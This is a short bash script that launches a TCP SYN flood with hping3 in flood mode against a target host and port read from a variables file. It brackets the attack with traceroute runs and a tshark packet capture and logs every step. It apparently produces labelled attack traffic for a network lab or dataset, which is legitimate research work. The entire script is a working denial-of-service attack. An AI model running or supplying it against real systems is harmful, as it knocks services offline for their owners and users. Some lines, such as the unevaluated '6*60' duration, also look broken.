#!/bin/bash

#Import variables from file
source variables.sh

#Define variables
attack_type="TCP SYN Flood"
capture_file="attack1.pcap"
traceroute_log="attack1_traceroute.txt"
attack_stats_log="attack1_stats.txt"
attack_log="attack1.txt"
attack_duration=6*60 # in seconds
destination_ip=$machine11_ip
destination_port=$machine11_port

#Start Wireshark capture
tshark -i $interface -w "$capture_file" -F libcap & pid_tshark=$!

#Write to file
echo "Started Wireshark trace for attack $attack_type" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Traceroute to the victim
traceroute $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $traceroute_log

#Write to file
echo "Finished traceroute to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

echo "Start attack $attack_type" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Execute the attack and write the output to file
hping3 --flood --frag -p $destination_port -S $destination_ip | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log & pid_attack=$!

#Wait for the attack duration to be over
sleep $attack_duration

#Stop the attack
kill "$pid_attack"

#Write to file
echo "Stopped attack $attack_type" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Traceroute to the victim
traceroute $destination_ip | ts "[%b %d %H:%M:%.S]" |tee -a $traceroute_log

#Write to file
echo "Finished traceroute to $destination_ip" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log

#Stop the Wireshark capture
kill "$pid_tshark"

#Write to file
echo "Stopped Wireshark trace for attack $attack_type" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_log
